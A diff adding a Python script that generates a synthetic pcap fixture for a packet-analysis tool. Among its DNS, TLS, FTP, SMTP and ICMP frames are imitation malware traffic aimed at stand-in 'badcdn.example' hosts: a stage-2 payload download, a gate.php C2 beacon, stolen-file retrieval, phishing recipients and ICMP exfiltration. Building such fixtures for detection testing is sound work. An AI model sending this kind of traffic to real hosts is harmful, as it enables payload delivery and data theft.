@@ -1,0 +1,96 @@
+# Fixture writer for pcap_app: stdlib only (struct frames + ssl.MemoryBIO for genuine OpenSSL TLS 1.2 handshake
+# bytes; the server cert is an `openssl req -x509` self-signed cert). Independent of lib/meta.
+# usage: python3 GENERATOR_app.py out.pcap cert.pem key.pem
+import ssl, struct, sys
+out, certf, keyf = sys.argv[1:4]
+
+def csum(b):
+    if len(b) % 2: b += b"\0"
+    s = sum(struct.unpack("!%dH" % (len(b)//2), b)); s = (s >> 16) + (s & 0xffff); s += s >> 16
+    return (~s) & 0xffff
+
+def ip4(src, dst, proto, payload):
+    a = bytes(map(int, src.split("."))); b = bytes(map(int, dst.split(".")))
+    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20+len(payload), 1, 0, 64, proto, 0, a, b)
+    return h[:10] + struct.pack("!H", csum(h)) + h[12:] + payload
+
+def tcp(sp, dp, seq, flags, data=b""):
+    return struct.pack("!HHIIBBHHH", sp, dp, seq, 1, 0x50, flags, 65535, 0, 0) + data
+
+def udp(sp, dp, data):
+    return struct.pack("!HHHH", sp, dp, 8+len(data), 0) + data
+
+def eth(l3):
+    return b"\x00\x11\x22\x33\x44\x55" + b"\x66\x77\x88\x99\xaa\xbb" + b"\x08\x00" + l3
+
+def qname(n):
+    return b"".join(bytes([len(x)]) + x.encode() for x in n.split(".")) + b"\0"
+
+def dnsq(tid, name, qt=1):
+    return struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + qname(name) + struct.pack("!HH", qt, 1)
+
+def dnsr(tid, name, answers, rcode=0, qt=1):
+    m = struct.pack("!HHHHHH", tid, 0x8180 | rcode, 1, len(answers), 0, 0) + qname(name) + struct.pack("!HH", qt, 1)
+    for rt, rd in answers:   # owner name = pointer to the question (0xc00c)
+        m += b"\xc0\x0c" + struct.pack("!HHIH", rt, 1, 300, len(rd)) + rd
+    return m
+
+pk = []
+C, S, DNS = "10.0.0.5", "203.0.113.10", "10.0.0.53"
+# DNS / UDP
+pk.append(eth(ip4(C, DNS, 17, udp(40001, 53, dnsq(1, "update.badcdn.example")))))
+pk.append(eth(ip4(DNS, C, 17, udp(53, 40001, dnsr(1, "update.badcdn.example", [(1, bytes([203,0,113,10]))])))))
+pk.append(eth(ip4(C, DNS, 17, udp(40002, 53, dnsq(2, "update.badcdn.example")))))
+# CNAME whose target compresses onto the question's 'badcdn.example' suffix (offset 12+7=19 -> 0xc013)
+cn = b"\x03cdn" + b"\xc0\x13"
+pk.append(eth(ip4(DNS, C, 17, udp(53, 40002, dnsr(2, "update.badcdn.example", [(5, cn), (1, bytes([198,51,100,7]))])))))
+pk.append(eth(ip4(C, DNS, 17, udp(40003, 53, dnsq(3, "nothere.example.org")))))
+pk.append(eth(ip4(DNS, C, 17, udp(53, 40003, dnsr(3, "nothere.example.org", [], rcode=3)))))
+pk.append(eth(ip4(C, DNS, 17, udp(40004, 53, dnsq(4, "ipv6.example.net", 28)))))
+pk.append(eth(ip4(DNS, C, 17, udp(53, 40004, dnsr(4, "ipv6.example.net", [(28, bytes.fromhex("20010db8000000000000000000000042"))], qt=28)))))
+# DNS / TCP (length-prefixed)
+q = dnsq(5, "tcp-lookup.example.com"); pk.append(eth(ip4(C, DNS, 6, tcp(40100, 53, 5000, 0x18, struct.pack("!H", len(q)) + q))))
+# HTTP
+r1 = b"GET /payload/stage2.bin?id=7 HTTP/1.1\r\nHost: dl.badcdn.example\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Loader/1.2\r\nAccept: */*\r\n\r\n"
+pk.append(eth(ip4(C, S, 6, tcp(49152, 80, 1000, 0x18, r1))))
+pk.append(eth(ip4(C, S, 6, tcp(49152, 80, 1000, 0x18, r1))))     # retransmission
+rs = b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 4\r\n\r\nMZ\x90\x00"
+pk.append(eth(ip4(S, C, 6, tcp(80, 49152, 7000, 0x18, rs))))
+r2 = b"POST /gate.php HTTP/1.1\r\nHost: panel.badcdn.example:8080\r\nUser-Agent: curl/8.5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 9\r\n\r\nhost=pc01"
+pk.append(eth(ip4(C, S, 6, tcp(49153, 8080, 2000, 0x18, r2))))
+pk.append(eth(ip4(S, C, 6, tcp(8080, 49153, 9000, 0x18, b"HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\nContent-Length: 0\r\n\r\n"))))
+# TLS 1.2 via OpenSSL MemoryBIO
+cctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); cctx.check_hostname = False; cctx.verify_mode = ssl.CERT_NONE
+cctx.set_alpn_protocols(["h2", "http/1.1"])
+sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); sctx.maximum_version = ssl.TLSVersion.TLSv1_2
+sctx.load_cert_chain(certf, keyf); sctx.set_alpn_protocols(["http/1.1"])
+ci, co, si, so = ssl.MemoryBIO(), ssl.MemoryBIO(), ssl.MemoryBIO(), ssl.MemoryBIO()
+cl = cctx.wrap_bio(ci, co, server_hostname="update.badcdn.example"); sv = sctx.wrap_bio(si, so, server_side=True)
+try: cl.do_handshake()
+except ssl.SSLWantReadError: pass
+hello = co.read(); si.write(hello)
+try: sv.do_handshake()
+except ssl.SSLWantReadError: pass
+flight = so.read()
+open(out + ".clienthello", "wb").write(hello)
+pk.append(eth(ip4(C, S, 6, tcp(49200, 443, 30000, 0x18, hello))))
+half = len(flight) // 2      # server flight split over two segments (Certificate spans them)
+pk.append(eth(ip4(S, C, 6, tcp(443, 49200, 80000, 0x10, flight[:half]))))
+pk.append(eth(ip4(S, C, 6, tcp(443, 49200, 80000 + half, 0x18, flight[half:]))))
+# FTP / SMTP / ICMP
+pk.append(eth(ip4(C, S, 6, tcp(49300, 21, 100, 0x18, b"USER anonymous\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49300, 21, 116, 0x18, b"PASS hunter2!\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49301, 21, 100, 0x18, b"USER svc_backup\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49301, 21, 117, 0x18, b"PASS Winter2026\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49301, 21, 134, 0x18, b"RETR loot.zip\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49400, 25, 100, 0x18, b"EHLO pc01.corp.local\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49400, 25, 122, 0x18, b"MAIL FROM:<it-support@corp.local>\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49400, 25, 157, 0x18, b"RCPT TO:<victim@target.example>\r\n"))))
+pk.append(eth(ip4(C, S, 6, tcp(49400, 25, 190, 0x18, b"RCPT TO:<cfo@target.example>\r\n"))))
+pk.append(eth(ip4(C, S, 1, struct.pack("!BBHHH", 8, 0, 0, 1, 1) + b"exfil:c2VjcmV0\x00\x00")))
+pk.append(eth(ip4(S, C, 1, struct.pack("!BBHHH", 0, 0, 0, 1, 1) + b"exfil:c2VjcmV0\x00\x00")))
+
+with open(out, "wb") as f:
+    f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
+    for i, p in enumerate(pk):
+        f.write(struct.pack("<IIII", 1700000000 + i, 0, len(p), len(p)) + p)
